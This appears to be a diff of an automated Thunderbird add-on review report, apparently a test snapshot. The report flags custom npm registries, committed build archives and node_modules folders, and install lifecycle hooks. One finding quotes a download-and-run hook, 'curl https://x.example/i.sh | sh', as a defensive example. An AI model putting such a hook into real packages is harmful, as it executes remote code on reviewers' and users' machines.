@@ -2,13 +2,26 @@
 
 Thank you for your submission. We appreciate the effort you’ve put into creating this add-on. However, it cannot be accepted and hosted on addons.thunderbird.net in its current form. The following findings caused the submission to be rejected:
 
-1) A committed build artifact (dist/addon.zip) is not allowed. A built archive (a .xpi/.zip) is produced from the source during the build and must never be part of the submission, where its bytes cannot be verified against what the build produces. Remove it and resubmit.
+1) The following .npmrc file(s) set a package registry, which is not allowed. Remove the registry setting - the build must resolve every dependency from the default public npm registry (registry.npmjs.org). A custom registry pulls the declared package names from an undeclared source, making package.json and the lock file a decoy.
+ - [SCA] .npmrc:1 - https://npm.internal.example/
+ - [SCA] tools/.npmrc:1 - https://mirror.example/npm/
+
+2) The following committed build artifact(s) are not allowed. A built archive (a .xpi/.zip) is produced from the source during the build and must never be part of the submission, where its bytes cannot be verified against what the build produces. Remove them and resubmit.
  - [SCA] dist/addon.zip
+ - [SCA] dist/legacy.xpi
+
+3) The following committed node_modules folder(s) are not allowed. The declared dependencies are installed from package.json/lock during the build, so node_modules must never be part of the submission. Remove them and resubmit.
+ - [SCA] node_modules
+ - [SCA] tools/node_modules
+
+4) This add-on is built with yarn, and only npm and pnpm are supported. Please provide an npm or pnpm build (commit a package-lock.json or pnpm-lock.yaml) so the dependency install can be reviewed against the declared dependencies.
+ - [SCA] yarn.lock
 
 We kindly ask you to resolve the following issues with your next release:
 
-2) The package.json declares an npm install lifecycle hook (postinstall: curl https://x.example/i.sh | sh) that runs when the reviewer installs the dependencies, before the build. Confirm it only runs local build steps and does not fetch or execute remote code (curl/wget, a download-and-run, or a git clone of an unpinned repo).
- - [SCA] package.json:6
+5) The package.json declares the following npm install lifecycle hook(s), which run when the reviewer installs the dependencies, before the build. Confirm they only run local build steps and do not fetch or execute remote code (curl/wget, a download-and-run, or a git clone of an unpinned repo).
+ - [SCA] package.json:6 - postinstall: curl https://x.example/i.sh | sh
+ - [SCA] package.json:7 - prepare: node tools/gen.js
 
 [XPI] = source file in the submitted XPI
 [SCA] = source file in the submitted source code archive
@@ -111,4 +124,4 @@ Because the original project is still active, your submission does not meet thes
 
 ── Summary ──
 
-1 error(s), 1 warning(s), 0 info, 1 extended code review step(s), 1 extended manual review step(s), 10 standard manual review step(s)
+7 error(s), 2 warning(s), 0 info, 1 extended code review step(s), 1 extended manual review step(s), 10 standard manual review step(s)
